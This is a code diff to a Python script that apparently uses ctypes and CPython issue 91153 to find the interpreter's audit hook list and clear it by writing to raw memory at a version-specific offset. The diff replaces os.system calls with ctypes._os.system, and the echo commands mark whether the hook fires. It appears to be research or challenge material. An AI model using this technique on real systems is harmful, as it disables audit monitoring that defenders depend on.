@@ -4,13 +4,13 @@
 ### use ctypes to get the addr and smash it with issues/91153
 
 from audit_hook_head_finder import add_audit
-import ctypes, os
+import ctypes
 
 add_audit()
 
 obj = ctypes.byref(ctypes.py_object(()))
 
-os.system("echo 'test audit hook -- this will trigger hook'")
+ctypes._os.system("echo 'test audit hook -- this will trigger hook'")
 
 # following arbitery reading/writing exploit code from https://github.com/python/cpython/issues/91153#issuecomment-1132117665
 # by chilaxan
@@ -41,4 +41,4 @@ for i in range(0, 8):
     # Python 3.12 = -0x11df0
     memory[ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value -0x11df0 + i] = 0
 
-os.system("echo 'test audit hook -- this will not'")
+ctypes._os.system("echo 'test audit hook -- this will not'")
